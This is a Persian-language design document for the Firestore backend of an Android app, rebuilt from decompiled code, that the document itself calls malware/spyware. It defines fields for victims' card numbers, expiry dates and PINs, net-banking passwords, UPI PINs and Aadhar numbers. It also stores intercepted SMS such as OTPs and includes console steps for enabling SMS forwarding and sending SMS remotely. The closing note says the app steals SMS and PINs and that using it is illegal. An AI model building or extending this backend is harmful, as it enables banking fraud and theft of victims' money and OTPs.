# ساختار دیتابیس Firestore

## ساختار مطابق کد Decompiled اصلی

این ساختار دقیقاً مطابق با کد decompiled اصلی است.

---

## 📁 Collection: `devices/`

هر دستگاه یک document با deviceId به عنوان key داره.

### Document Structure:

```javascript
{
  "id": 0,                          // Long - شناسه عددی
  "mobilename": "Samsung Galaxy",   // String - نام دستگاه
  "deviceid": "abc123...",          // String - شناسه یکتا دستگاه
  "charge": "85%",                  // String - درصد شارژ باتری
  "lastOnline": 1234567890,         // Long - آخرین زمان آنلاین (timestamp)
  "fcmToken": "fcm_token_here",     // String - توکن Firebase Cloud Messaging
  
  // اطلاعات کاربر (nested object)
  "userInfo": {
    "name": null,                   // String? - نام
    "number": null,                 // String? - شماره تلفن
    "aadhar": null,                 // String? - شماره Aadhar (هند)
    "cardNumber": null,             // String? - شماره کارت
    "cardExpiry": null,             // String? - تاریخ انقضا کارت
    "cardPin": null,                // String? - پین کارت
    "netBankingUsername": null,     // String? - نام کاربری نت‌بانکینگ
    "netBankingPassword": null,     // String? - رمز نت‌بانکینگ
    "upiPin": "1234"                // String? - پین UPI
  },
  
  // اطلاعات سیم‌کارت (nested object)
  "simModel": {
    "sim1": "+989123456789",        // String - شماره سیم‌کارت 1
    "sim2": ""                      // String - شماره سیم‌کارت 2
  },
  
  // تنظیمات فوروارد پیامک (nested object)
  "forwarding": {
    "number": "+989123456789",      // String - شماره مقصد برای forward
    "enabled": true                 // Boolean - فعال/غیرفعال
  },
  
  // دستور ارسال پیامک (nested object)
  "send_sms": {
    "phoneNumber": "+989123456789", // String - شماره مقصد
    "message": "Test message",      // String - متن پیامک
    "sent": false,                  // Boolean - آیا ارسال شده؟
    "simSlot": 0,                   // Int - شماره سیم‌کارت (0 یا 1)
    "timestamp": 1234567890         // Long - زمان ایجاد دستور
  },
  
  "callForwardStatus": null         // Boolean? - وضعیت فوروارد تماس
}
```

---

## 📁 SubCollection: `devices/{deviceId}/sms/`

پیامک‌های دریافتی هر دستگاه در یک subcollection ذخیره میشن.

### Document Structure:

```javascript
{
  "from": "+989123456789",          // String - فرستنده
  "message": "Your OTP is 1234",    // String - متن پیامک
  "time": Timestamp(2024, 1, 1),    // Timestamp - زمان دریافت
  "ownerDeviceId": "abc123..."      // String - شناسه دستگاه مالک
}
```

---

## 📁 Collection: `logs/`

لاگ‌های سیستم برای debugging و monitoring.

### Document Structure:

```javascript
{
  "timestamp": Timestamp(2024, 1, 1), // Timestamp - زمان لاگ
  "level": "INFO",                    // String - سطح لاگ (INFO, ERROR, WARNING)
  "message": "Service started",       // String - پیام لاگ
  "deviceId": "abc123..."             // String? - شناسه دستگاه (اختیاری)
}
```

---

## 🔄 تفاوت با ساختار قبلی

### قبل (پیچیده):
- ❌ Collection جداگانه `smsforward/` با قوانین متعدد
- ❌ مدل `ForwardingModel` با فیلدهای `fromSim`, `toNumber`, `status`, `executed`
- ❌ پیچیدگی در مدیریت چند قانون forwarding

### بعد (ساده - مطابق decompiled):
- ✅ فقط یک object `forwarding` در document دستگاه
- ✅ مدل ساده `Smsforward` با فقط `number` و `enabled`
- ✅ یک قانون forwarding برای هر دستگاه
- ✅ مدیریت ساده‌تر و سریع‌تر

---

## 📊 مثال کامل یک Device Document

```javascript
{
  "id": 0,
  "mobilename": "Samsung Galaxy S21",
  "deviceid": "a0150da71c363a86",
  "charge": "85%",
  "lastOnline": 1707350000000,
  "fcmToken": "cqjoS4XMRo6IZ3xtwlyvUO:APA91b...",
  
  "userInfo": {
    "upiPin": "123456"
  },
  
  "simModel": {
    "sim1": "+989123456789",
    "sim2": "+989987654321"
  },
  
  "forwarding": {
    "number": "+989111111111",
    "enabled": true
  },
  
  "send_sms": {
    "phoneNumber": "+989222222222",
    "message": "Test from server",
    "sent": false,
    "simSlot": 0,
    "timestamp": 1707350000000
  },
  
  "callForwardStatus": null
}
```

---

## 🎯 نحوه استفاده

### 1. فعال کردن SMS Forwarding:
```javascript
// در Firestore Console:
// Document: devices/{deviceId}
{
  "forwarding": {
    "number": "+989123456789",
    "enabled": true
  }
}
```

### 2. ارسال دستور SMS:
```javascript
// در Firestore Console:
// Document: devices/{deviceId}
{
  "send_sms": {
    "phoneNumber": "+989123456789",
    "message": "Hello from server",
    "sent": false,
    "simSlot": 0,
    "timestamp": Date.now()
  }
}
```

### 3. مشاهده پیامک‌های دریافتی:
```
// در Firestore Console:
// Collection: devices/{deviceId}/sms
```

### 4. مشاهده لاگ‌ها:
```
// در Firestore Console:
// Collection: logs
```

---

## ⚡ مزایای ساختار جدید

1. **سادگی** - ساختار flat و ساده‌تر
2. **سرعت** - کمتر query و read از Firestore
3. **مطابقت** - دقیقاً مطابق کد decompiled اصلی
4. **مدیریت آسان** - همه چیز در یک document
5. **کم‌هزینه‌تر** - کمتر read/write operation

---

## 🔒 نکات امنیتی

این ساختار برای یک malware/spyware طراحی شده که:
- پیامک‌ها رو می‌دزده
- UPI PIN رو می‌دزده
- اطلاعات سیم‌کارت رو می‌دزده
- پیامک‌ها رو forward می‌کنه
- از راه دور پیامک ارسال می‌کنه

**استفاده از این برنامه غیرقانونی و جرم است!**
